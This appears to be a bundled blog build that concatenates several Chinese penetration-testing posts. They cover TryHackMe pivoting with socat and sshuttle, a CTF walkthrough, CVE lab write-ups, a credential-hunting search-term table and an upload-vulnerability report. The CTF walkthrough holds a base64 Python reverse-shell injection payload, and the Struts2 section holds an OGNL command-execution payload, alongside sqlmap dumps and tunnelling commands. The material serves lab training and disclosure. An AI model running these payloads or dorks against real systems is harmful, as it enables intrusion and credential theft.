然而，一般来说，黑客倾向于使用它来创建反向/绑定 shell，或者如上例所示，创建一个端口转发。具体来说，在上面的示例中，我们将创建一个_从_受感染服务器上的端口转发_到_我们自己机器上的侦听端口的端口。不过，我们可以用另一种方式来实现，通过将连接从攻击机器转发到网络内部的目标，或者在_攻击机器_上的侦听端口与内部服务器上的服务之间创建直接链接。后一个应用程序特别有用，因为它不需要在受感染的服务器上打开端口。

在使用 socat 之前，通常需要为它下载一个二进制文件，然后将其上传到盒子中。

**例如，使用 Python Web 服务器：-**

在 Kali 上（在包含 Socat 二进制文件的目录内）：

\`sudo python3 -m http.server 80\`

然后，在目标上：  
\`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME\`

![Demonstration of using cURL with a Python HTTP server to upload files](https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png)

上传二进制文件后，让我们依次看一下上述每个场景。

_**注意：**这将上传标题中带有您的用户名的 socat 二进制文件;但是，此任务其余部分给出的示例命令将二进制文件简称为_ _._\`socat\`  

---

**Reverse Shell 继电器**

在这个场景中，我们使用 socat 创建一个中继，以便我们将反向 shell 发送回我们自己的攻击机器（如上图所示）。首先，让我们在攻击框 （） 上启动一个标准的 netcat 监听器。接下来，在受损的服务器上，使用以下命令启动中继：\`sudo nc -lvnp 443\`  
\`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &   \`

_**注意：**这两个地址的顺序在这里很重要。确保先打开侦听端口，_然后再_连接回攻击机器。_  

然后，我们可以从这里创建一个反向 shell，指向受感染服务器上新打开的端口 8000。以下屏幕截图演示了这一点，在远程服务器上使用 netcat 模拟从目标服务器接收反向 shell：

![Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell](https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png)

上述命令的简要说明：

- \`tcp-l:8000\`用于创建连接的前半部分 -- 目标计算机的 TCP 端口 8000 上的 IPv4 侦听器。
- \`tcp:ATTACKING_IP:443\`在端口 443 上连接回我们的本地 IP。显然，需要正确填写ATTACKING_IP才能正常工作。
- \`&\`将侦听器置于后台，将其转换为 Job，以便我们仍然可以使用 shell 来执行其他命令。

中继连接回使用标准 netcat 侦听器的别名启动的侦听器：。\`sudo nc -lvnp 443\`  

通过这种方式，我们可以设置一个中继，通过受感染的系统发送反向 shell，回到我们自己的攻击机器。这种技术也可以很容易地被链接起来;但是，在许多情况下，仅上传 Netcat 的静态副本以直接在受感染的服务器上接收反向 shell 可能更容易。

---

**端口转发 -- Easy**

![](https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png)使用 socat 设置端口转发的快速简便的方法非常简单，就是在受感染的服务器上打开一个侦听端口，并将进入其中的任何内容重定向到目标服务器。例如，如果受损的服务器是 172.16.0.5，目标是 172.16.0.10 的端口 3306，我们可以使用以下命令（在受损的服务器上）创建端口转发：  
\`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &   \`

这会在受感染的服务器上打开端口 33060，并将来自攻击机器的输入直接重定向到预期的目标服务器，基本上让我们可以访问在我们的目标 172.16.0.10 上运行的（可能是 MySQL 数据库）。该选项用于将每个连接放入新进程中，该选项表示在建立连接后端口保持打开状态。它们结合起来，允许我们对多个连接使用相同的端口转发。我们再次用于 shell 的后台，允许我们在受感染的服务器上继续使用相同的终端会话来处理其他事情。\`fork\`\`reuseaddr\`\`&\`

现在，我们可以连接到中继 （172.16.0.5） 上的端口 33060，并将我们的连接直接中继到我们的预期目标 172.16.0.10：3306。

---

**端口转发 -- 安静**

以前的技术既快速又简单，但它也会在受感染的服务器上打开一个端口，该端口可能会被任何类型的主机或网络扫描发现。虽然风险并不_大_，但了解一种稍微安静的 socat 端口转运方法是值得的。此方法稍微复杂一些，但不需要在受感染的服务器上从外部打开端口。

首先，在我们自己的攻击机器上，我们发出以下命令：  
\`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &\`

这将打开两个端口：8000 和 8001，从而创建一个本地端口中继。进入其中一个的东西会从另一个出来。因此，端口 8000 还设置了 and 选项，以允许我们使用此端口转发创建多个连接。\`fork\`\`reuseaddr\`

接下来，在受损的中继服务器（上一个示例中为 172.16.0.5）上，我们执行以下命令：  
\`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &   \`

这会在攻击机器上的监听端口 8001 和目标服务器的开放端口之间建立连接。要使用之前的虚构网络，我们可以输入以下命令：  
\`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &   \`

这将在我们的攻击机器上的端口 8000 和预期目标 （172.16.0.10） 上的端口 80 之间创建一个链接，这意味着我们可以在攻击机器的 Web 浏览器中加载目标提供的网页：172.16.0.10：80！\`localhost:8000\`

这是一个相当复杂的可视化场景，因此让我们快速了解一下当您尝试在浏览器中访问网页时会发生什么：

![](https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png)

- 请求将转到\`127.0.0.1:8000\`
- 由于我们在自己的机器上启动了 socat 侦听器，任何进入端口 8000 的东西都会从端口 8001 出来
- 端口 8001 直接连接到我们在受感染服务器上运行的 socat 进程，这意味着从端口 8001 传出的任何内容都会被发送到受感染的服务器，在那里它被中继到目标服务器上的端口 80。

然后，当目标发送响应时，该过程将反转：

- 响应将发送到受感染服务器上的 socat 进程。进入进程的内容从另一端出来，恰好直接链接到我们攻击机器上的端口 8001。
- 进入我们攻击机器上端口 8001 的任何内容都来自我们攻击机器上的端口 8000，这是 Web 浏览器希望接收其响应的地方，因此页面被接收和呈现。

我们现在实现了与以前相同的目标，但没有在服务器上打开任何端口！  

---

最后，我们已经学习了如何_创建_后台 socat 端口转发和中继，但知道如何_关闭_它们也很重要。解决方案很简单：在终端中运行命令，然后使用 ：\`jobs\`\`kill %NUMBER\`

![Demonstration for how to kill background jobs](https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png)


这个工具与我们到目前为止介绍的其他工具完全不同。它不执行端口转发，它创建的代理与我们已经看到的完全不同。相反，它使用 SSH 连接来创建隧道代理，其作用类似于新接口。简而言之，它模拟了一个 VPN，允许我们通过代理路由我们的流量_，而无需使用 proxychains_（或等效的）。我们可以像通常连接到联网设备一样直接连接到目标网络中的设备。由于它通过 SSH（安全 shell）创建隧道，因此我们通过隧道发送的任何内容也被加密，这是一个不错的奖励。我们完全在攻击机器上使用 sshutt，就像我们通过 SSH 连接到远程服务器一样。  

虽然这听起来像是一个令人难以置信的升级，但它并非没有缺点。首先，sshuttle 仅适用于 Linux 目标。它还需要通过 SSH 访问受感染的服务器，并且还需要在服务器上安装 Python。也就是说，通过 SSH 访问，理论上可以上传 Python 的静态副本并使用它。这些限制确实在一定程度上限制了 sshuttle 的用途;然而，当_它是一个_选项时，它往往是一个极好的赌注！

首先，我们需要安装 sshuttle。在 Kali 上，这就像使用包管理器一样简单：\`apt\`  
\`sudo apt install sshuttle\`  

---

使用 sshuttle 连接到服务器的基本命令如下：  
\`sshuttle -r username@address subnet\`   

例如，在我们虚构的 172.16.0.x 网络中，服务器位于 172.16.0.5 并遭到入侵，命令可能如下所示：  
\`sshuttle -r user@172.16.0.5 172.16.0.0/24\`  

然后，系统会要求我们输入用户的密码，并建立代理。然后，该工具将被动地位于后台，并将相关流量转发到目标网络。  

除了指定子网，我们还可以使用选项，该选项尝试根据受感染服务器自己的路由表自动确定它们：\`-N\`  
\`sshuttle -r username@address -N\`  

请记住，这可能并不总是成功的！  

与以前的工具一样，这些命令也可以通过在末尾附加 & （） 符号来作为后台。\`&\`

如果这有效，您应该会看到以下行：  
\`c : Connected to server.\`  

---

嗯，这很好，但是如果我们没有用户的密码，或者服务器只接受基于密钥的身份验证，会发生什么情况呢？

不幸的是，sshuttle 目前似乎没有指定用于向服务器进行身份验证的私钥的简写。也就是说，我们可以使用开关轻松绕过此限制。\`--ssh-cmd\`

此开关允许我们指定在尝试对受感染的服务器进行身份验证时由 sshuttle 执行的命令。默认情况下，这没有参数。通过开关，我们可以选择不同的命令来执行身份验证：例如，，！\`ssh\`\`--ssh-cmd\`\`ssh -i keyfile\`

因此，当使用基于密钥的身份验证时，最终命令如下所示：  
\`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET\`  

使用我们之前的示例，命令将是：  
\`sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24\`  

---

**请注意：**使用 sshuttle 时，您可能会遇到如下所示的错误：  
\`client: Connected.   client_loop: send disconnect: Broken pipe   client: fatal: server died with error code 255\`  

当您连接到的受感染计算机是您尝试访问的子网的一部分时，可能会发生这种情况。例如，如果我们连接到 172.16.0.5 并尝试转发 172.16.0.0/24，那么我们会将受感染的服务器包含在新转发的子网中，从而中断连接并导致工具死机。

为了解决这个问题，我们告诉 sshuttle 使用交换机从子网范围中排除受感染的服务器。\`-x\`

使用我们之前的示例：  
\`sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5\`  

这将允许 sshuttle 在不中断自身的情况下创建连接。


## 内网渗透

![](../assets/img/Pasted%20image%2020241121165626.png)

![](../assets/img/Pasted%20image%2020241121170006.png)

![](../assets/img/Pasted%20image%2020241121170243.png)

代理隧道

\`\`\`
sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i id_rsa" 10.200.85.200/24 -x 10.200.85.200
\`\`\`


![](../assets/img/Pasted%20image%2020241121171018.png)

## 📚 知识点回顾

- **信息搜集技巧**：
    - 端口扫描与服务枚举技巧。
    - Web 漏洞检测技巧（SQL 注入、XSS 等）。
- **漏洞利用技巧**：
    - 如何使用 Metasploit 或自行编写漏洞利用脚本。
    - 获取反向 shell 与持续访问。
- **Post-Exploitation 技巧**：
    - 获取目标的敏感信息和访问权限。
    - 提升权限，进行横向移动。

---

## 🧳 攻击链与流程图

- 可视化渗透测试的整体攻击过程，确保每一步都清晰。

---

## 📅 总结

- **成功步骤**：简要描述成功的渗透测试步骤和关键点。
- **遇到的困难与挑战**：列出在过程中遇到的难点及解决方案。
- **后续建议**：对靶场的进一步探索或防御建议。
`,fn=`wsl --shutdown && wsl


\`.wslconfig\`

\`\`\`
[experimental]
networkingMode=mirrored
dnsTunneling=true
firewall=true
autoProxy=true
\`\`\``,wn=`---
title: thm-otf
tags:
  - 靶场
  - THM
description:
---
> 

## 靶场概述

难度： hard
描述：千万别小看狡猾的老狐狸......
你能躲过狡猾的狐狸吗？

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息      |
| --- | ----------- | ----------- |
| IP  | 10.17.5.121 | 10.10.206.5 |
| OS  | kali        | Linux       |

---
## 信息搜集

端口扫描
![](../assets/img/Pasted%20image%2020241126000314.png)
\`\`\`
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
\`\`\`

1. **80/tcp (HTTP)**:
    
    - **Web服务漏洞**：端口80通常用于HTTP服务，如果该端口上有Web服务运行，可能存在Web应用漏洞（如SQL注入、跨站脚本攻击XSS、文件上传漏洞等）。
    - **远程代码执行**：Web服务如果存在漏洞（如未修补的CMS、脆弱的Web框架等），攻击者可能利用漏洞实现远程代码执行。
    - **信息泄露**：HTTP服务也可能泄露服务器的敏感信息，如错误信息、配置文件、数据库信息等，提供攻击者进一步入侵的线索。
2. **139/tcp (NetBIOS-SSN)**:
    
    - **NetBIOS/SMB漏洞**：端口139是与Windows网络共享和文件共享相关的NetBIOS服务。攻击者可以通过这个端口利用诸如**EternalBlue**等漏洞攻击Windows机器，进行远程代码执行。
    - **SMB协议漏洞**：如果服务器使用较旧的SMB协议（如SMBv1），攻击者可能利用SMB协议中的已知漏洞（如**MS17-010**）来发起攻击。
3. **445/tcp (Microsoft-DS)**:
    
    - **SMB远程代码执行漏洞**：端口445用于Microsoft的SMB协议，是攻击者常用的目标。如果存在未修补的漏洞，尤其是**EternalBlue**等著名漏洞，攻击者可以利用这个漏洞进行远程代码执行。
    - **暴力破解和身份验证绕过**：如果SMB服务没有正确配置，攻击者可能通过暴力破解或枚举用户

![](../assets/img/Pasted%20image%2020241126000730.png)


配置hosts
	

![](../assets/img/Pasted%20image%2020241126001226.png)
\`\`\`
 enum4linux 10.10.206.5 -U
\`\`\`

获取到了
![](../assets/img/Pasted%20image%2020241126003656.png)
fox和rascal

80端口需要配置
![](../assets/img/Pasted%20image%2020241126000430.png)
## 攻击向量


可以尝试进行密码爆破

\`\`\`
hydra -L user -P /usr/share/wordlists/rockyou.txt 10.10.206.5 http-get
\`\`\`

\`\`\` use
rascal
\`\`\`


![](../assets/img/Pasted%20image%2020241126005148.png)

![](../assets/img/Pasted%20image%2020241126010109.png)

1. \`\\";/usr/bin/id\\n \` 这个
    
    这个字符串 \`\\";/usr/bin/id\\n\` 看起来像是一个试图在命令行中执行命令注入的payload。
    
    1. **\`\\"\`**：
        
        - 这个字符是转义的双引号 (\`\\"\`)，它的作用是结束当前的字符串或命令参数。这通常用来突破命令的语法结构，并可能结束一个命令或字符串参数，使攻击者能够插入自己的命令。
    2. **\`;\`**：
        
        - 这是命令分隔符。在Unix和Linux系统中，\`；\`（分号）用于分隔不同的命令。在命令注入中，攻击者可以通过插入分号来结束当前的命令并开始执行新的命令。
    3. **\`/usr/bin/id\`**：
        
        - 这是Linux/Unix系统中的一个命令，\`id\` 命令用于显示当前用户的身份信息，包括用户ID（UID）、组ID（GID）等。
        - 攻击者可能希望通过注入此命令来查看当前用户的权限或获取敏感信息。
    4. **\`\\n\`**：
        
        - 这是换行符，通常表示命令结束并换到新的一行，通常在多行命令中用来表示结束。
## 漏洞利用

\`\`\`
{"target":"\\";echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTcuNS4xMjEiLDQ0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==|base64 -d|bash\\n"}
\`\`\`
![](../assets/img/Pasted%20image%2020241126011326.png)

![](../assets/img/Pasted%20image%2020241126011416.png)

\`\`\`
chisel server -p 8081 --reverse
\`\`\`

\`\`\`
www-data@year-of-the-fox:/tmp$ ./ch client 10.17.5.121:8081 R:10.17.5.121:2222:localhost:22
\`\`\`
![](../assets/img/Pasted%20image%2020241126013254.png)

![](../assets/img/Pasted%20image%2020241126013559.png)
![](../assets/img/Pasted%20image%2020241126013748.png)

## 提权

\`\`\`
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown

\`\`\`

在目标机器上开启http服务，下载shutdown,发现他调用了poweroff,且没有使用绝对路径

![](../assets/img/Pasted%20image%2020241126014336.png)
![](../assets/img/Pasted%20image%2020241126014324.png)
![](../assets/img/Pasted%20image%2020241126014426.png)
## 知识点回顾
## 总结

`,Pn=`
![](assets/img/Pasted%20image%2020241115180152.png)


`,Tn=`---
title: 微信小程序渗透流程
tags:
  - 微信小程序
password: lidefei
---
## 找到目标
微信电脑版可运行微信小程序，所以我们可以直接在电脑版进行搜索。

## 找到小程序的包
进行反编译 反解密
`,yn=`---
title: 想要什么
date: 2024-02-29-13:56:00
tags:
  - 胡思乱想
---
## 思考想要什么

处于变局之中, 要保存能力,养好身体, 慢慢爬行.`,Cn="---\ntitle: 敏感信息泄露\n---\n\n| **Search Term**            | **Search Term**         | **Search Term**                                | **Search Term**                          |\n| -------------------------- | ----------------------- | ---------------------------------------------- | ---------------------------------------- |\n| `AWSSecretKey`             | `dbpassword`            | `pwd`                                          | `filename:WebServers.xml`                |\n| `JEKYLL_GITHUB_TOKEN`      | `dbuser`                | `pwds`                                         | `filename:idea14.key`                    |\n| `SF_USERNAME salesforce`   | `dot-files`             | `rds.amazonaws.com password`                   | `filename:.netrc password`               |\n| `access_key`               | `dotfiles`              | `redis_password`                               | `filename:known_hosts`                   |\n| `access_token`             | `encryption_key`        | `root_password`                                | `filename:logins.json`                   |\n| `amazons3`                 | `FabricApiSecret`       | `apiSecret`                                    | `filename:makefile`                      |\n| `api_key`                  | `fb_secret`             | `secret_password`                              | `filename:bash_history`                  |\n| `api_secret`               | `firebase`              | `secret_access_key`                            | `filename:bash_profile`                  |\n| `apidos`                   | `ftp`                   | `secret_key`                                   | `filename:bashrc`                        |\n| `apikey`                   | `github_key`            | `secret_token`                                 | `filename:bashrc password`               |\n| `app_secret`               | `github_token`          | `sets`                                         | `filename:bashrc mailchimp`              |\n| `appkey`                   | `gitlab`                | `security_credentials`                         | `filename:config`                        |\n| `appsecret`                | `gmail_password`        | `send_keys`                                    | `filename:config.json`                   |\n| `application_key`          | `gmail_username`        | `send_keys`                                    | `filename:connections.xml`               |\n| `appsecret`                | `api.googlemaps AIZa`   | `herokuapp`                                    | `filename:credentials aws_access_key_id` |\n| `auth`                     | `irc_pass`              | `key`                                          | `filename:.bash_history`                 |\n| `auth_token`               | `KeyPassword`           | `ssh`                                          | `filename:.bash_profile aws`             |\n| `authorizationToken`       | `ldap_password`         | `ssh2_auth_password`                           | `filename:.bashrc password`              |\n| `aws_access`               | `ldap_username`         | `login`                                        | `filename:.cshrc`                        |\n| `aws_access_key_id`        | `mailchimp`             | `storepass`                                    | `filename:.docker/config auth`           |\n| `aws_secret`               | `mydotfiles`            | `mysql`                                        | `filename:.env`                          |\n| `aws_token`                | `master_key`            | `private_key`                                  | `filename:.env MAIL_HOST=smtp.gmail.com` |\n| `bashrc_password`          | `node_env`              | `pass`                                         | `filename:.git-credentials`              |\n| `bucket_secrets`           | `npmrc_auth`            | `oauth_token`                                  | `filename:.netrc`                        |\n| `client_secret`            | `pt_token`              | `secret_api`                                   | `filename:server.cfg`                    |\n| `config`                   | `send_keys`             | `ssh`                                          | `filename:settings.py SECRET_KEY`        |\n| `consumer_key`             | `passwords`             | `storepass`                                    | `filename:prod_secret.exs`               |\n| `credentials`              | `heroku_api_key`        | `preprod`                                      | `filename:wp-config.php`                 |\n| `database_password`        | `homebrew_api_key`      | `filename:prod_secret.exs NOT prod_secret.exs` | `filename:express.conf`                  |\n| `private_key`              | `config.php dbpassword` | `connections`                                  | `filename:deploy.rake`                   |\n| `filename:.bash_history`   | `ftpconfig`             | `shadow path:etc`                              | `filename:settings`                      |\n| `filename:connections.xml` | `filename:recents.xml`  | `sql`                                          | `filename:proftpdpasswd`                 |\n| `filename:docker.cfg`      | `auth_token`            | `filename:.travis`                             | `filename:config.json auths`             |\n| `filename:.npmrc_auth`     | `remote-sync.json`      | `filename:shadow`                              | `filename:sftp.json path:.vscode`        |\n| `filename:constants`       | `filename:secrets.yml`  | `rcon password`                                | `filename:.git-credentials`              |\n\n---",xn=`---
title: 未授权用户文件上传漏洞
password: lidefei
---
---
## **1. 基本信息**

- **漏洞名称**: 未授权文件上传漏洞
- **发现日期**: 2024/11/19
- **目标系统**:  \`cudboss.nxin.com\`
- **漏洞等级**:  低

---

## **2. 漏洞概述**

简要描述漏洞的核心问题，包括影响范围和潜在后果。  

> 文件上传功能缺少认证校验，导致攻击者无需登录即可上传任意文件到服务器。泄露敏感信息或导致服务中断。

---

## **3. 详细信息**

### **3.1 受影响的接口或功能**

- **URL**:  /api/boss/basic/system/file/upload
- **HTTP 方法**: POST
- **请求头**: 任意用户
- **参数**: 
    - \`filename\`：上传文件名称

### **3.2 漏洞成因**

解释漏洞产生的根本原因，例如：

- 缺乏身份认证或权限控制。
- 文件存储路径直接暴露在 Web 可访问区域。

---

## **4. 重现步骤**

提供详细的漏洞复现过程，确保漏洞接收方能轻松验证。

1. 访问目标上传页面或接口：
\`\`\`
POST /api/boss/basic/system/file/upload HTTP/1.1
Host: cudboss.nxin.com
Cookie: JSESSIONID=F54B94ACB8F98CB5470908A33BDDBB63; systemId=31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: https://cudboss.nxin.com/
Signtoken: 3336B7C506C31634
Systemid: 31
Origin: https://cudboss.nxin.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive
Content-Length: 201
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="a.php%00.txt"
Content-Type: text/plain

This is a test file
------WebKitFormBoundary7MA4YWxkTrZu0gW--
\`\`\`

![](assets/img/Pasted%20image%2020241119164105.png)

![](assets/img/Pasted%20image%2020241119164359.png)
---

## **5. 风险评估**

### **5.1 潜在风险**

- **信息泄露**: 攻击者可能利用上传的文件获取敏感信息。
- **拒绝服务攻击（DoS）**: 上传大文件或大量请求可能耗尽系统资源。
- **网站篡改**: 上传文件替换现有页面内容。

---

## **6. 修复建议**

### **6.1 短期措施**

- 关闭相关文件上传功能或限制其访问权限。

### **6.2 长期措施**

1. **权限控制**: 验证上传接口的用户身份和权限。
2. **文件类型校验**:
    - 使用白名单，限制可上传的文件类型（如 \`.jpg\`, \`.png\`）。
    - 验证文件的 MIME 类型和内容是否匹配。
3. **存储隔离**: 将文件存储在非 Web 可访问目录中。
4. **执行权限禁用**: 确保上传目录无法执行脚本文件。
5. **限制文件大小**: 设置合理的文件大小限制。
6. **病毒扫描**: 上传后扫描文件以检测恶意代码。

---
`;const En=`
### 场景1
主机1可以访问 10.10.11.29:80
但是主机2访问不到 ，主机2可以访问到主机1的ip

主机1执行 
\`\`\`
sudo socat TCP-LISTEN:8080,fork TCP:10.10.11.29:80
\`\`\`

主机1的信息
\`\`\`
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.255.255.254/32 brd 10.255.255.254 scope global lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:e3:58:b0 brd ff:ff:ff:ff:ff:ff
    inet 172.25.105.124/20 brd 172.25.111.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fee3:58b0/64 scope link
       valid_lft forever preferred_lft forever
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.10.16.83/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:4::1051/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::92d1:c70f:2dbe:3561/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
\`\`\`
意思是\`10.10.11.29:80\` fork 到本机的\`172.25.105.124:8080\` ，就是你访问ip:8080 也就是访问\`10.10.11.29:80\`


\`\`\`
route add 10.10.11.29 mask 255.255.255.255 172.25.105.124
\`\`\`


### 动态端口转发


\`\`\`
sudo socat TCP-LISTEN:8080,fork SOCKS5:127.0.0.1:lantern.htb:80,socksport=1080
\`\`\`




如果您希望使用简单的工具并通过配置文件来实现多端口代理，以下是几种适合的工具：

### 1. **\`redir\` (简单的端口转发工具)**

虽然 \`redir\` 本身没有直接支持多个端口代理的功能，但您可以通过配置文件或脚本的方式来启动多个端口转发。可以创建一个脚本，像这样：

bash

复制代码

\`#!/bin/bash  # 配置多个端口转发 redir --lport=80 --caddr=10.10.11.29 --cport=80 & redir --lport=8080 --caddr=10.10.11.29 --cport=8080 & redir --lport=443 --caddr=10.10.11.29 --cport=443 &\`

这种方法的优点是非常简单，但仍然需要通过脚本来配置多个端口。

### 2. **\`rinetd\` (配置文件方式)**

\`rinetd\` 是一个非常适合通过配置文件来管理多个端口转发的工具。您可以创建一个配置文件 \`/etc/rinetd.conf\`，内容如下：

bash

复制代码

\`# 转发配置 0.0.0.0 80 10.10.11.29 80 0.0.0.0 8080 10.10.11.29 8080 0.0.0.0 443 10.10.11.29 443\`

配置好后，您只需要启动 \`rinetd\`：

bash

复制代码

\`sudo rinetd\`
\`\`\`

\`\`\``,kn=`---
title: 胡思乱想
date: 2024-11-13 21:49:25
tags:
  - 胡思乱想
---
# 人类

在历史长河中人类就近扮演者什么样的角色, 造物者? 毁灭者? 亦或者是 一粒尘埃?
人生不过五六十年, 何必非要在不喜欢的事情上堵上自己的一生.人类最终的归途都是走向灭亡. 超过三代 你在世界上的痕迹便不存在了.

做点自己喜欢的.

## 想法

无论做什么，都要尝试把价值展示出来。
`;const Ln=`---
title: 如何在工作中成长
categories: [career]
tags: [wlb]     # TAG names should always be lowercase
---

或多或少有些在工作中遇到瓶颈期`,In=`---
title: Java 代码审计- SQLinjection
categories:
  - Java
  - 安全
tags:
  - Java
---

# Java 代码审计- SQLinjection

![Alt text](../../assets/img/image.png)`,Dn=`---
title: CVE-2022-23134
categories: [Blogging,CVE]
tags: [CVE]
---

## CVE-2022-23134
1. 描述

Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。

2. 分析
![1709358782253.png](https://img2.imgtp.com/2024/03/02/gXvwQ71v.png)

## FoFa

\`Title="Zabbix" && body="Zabbix SIA"\`


弱口令：\`Admin/zabbix\`


![1709359619020.png](https://img2.imgtp.com/2024/03/02/LifiuzlA.png)

![1709359666403.png](https://img2.imgtp.com/2024/03/02/CF8WaglB.png)

![1709359728362.png](https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png)

flag{3669658d-5ca3-47d7-943c-3d985df13fab}`,Mn=`---
title: CVE-2022-32991
categories: [Blogging,CVE]
tags: [CVE]     # TAG names should always be lowercase
---

## 描述

该CMS的welcome.php中存在SQL注入攻击。
## 位置
\`/welcome.php\`

![Alt text](../../assets/img/image-1.png)

## 漏洞分析

注册登录

在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。S
![Alt text](../../assets/img/image-2.png)
存在SQL注入漏洞，可以通过\`eid\`参数进行注入。

查询数据库

\`python sqlmap.py -u "http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --batch --dbs\`

指定数据库的表

\`python sqlmap.py -u "http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --batch -D "ctf" --tables\`

指定表的列
\`--batch -D "ctf" -T "flag" --columns\`

指定列的数据
\`--batch -D "ctf" -T "flag" -C "flag" --dump\`

![Alt text](../../assets/img/image-3.png)`,Nn=`---
title: CVE-2013-2134
categories: [Blogging,CVE]
tags: [CVE]     # TAG names should always be lowercase
---

## 描述

2.3.14.3 之前的 Apache Struts 2 允许远程攻击者通过带有在通配符匹配期间未正确处理的精心制作的操作名称的请求执行任意 OGNL 代码，这是与 CVE-2013-2135 不同的漏洞。

![1709310627242.png](https://img2.imgtp.com/2024/03/02/2AHlKUKx.png)

​如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 \`\${param_name}\` 作为重定向变量，例如：

\`\`\`xml
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=\${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>

\`\`\`
payload:


\`\`\`xml
\${#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q}.action
\`\`\`

要经过 URL 编码后才能使用：

\`\`\`xml
/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action
\`\`\`

\`\`\`xml

GET /%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27pwd%27%29.getInputStream%28%29%29%2C%23q%7D.action HTTP/1.1
Host: eci-2ze2jfnjxjq8n9r88rn2.cloudeci1.ichunqiu.com:8080
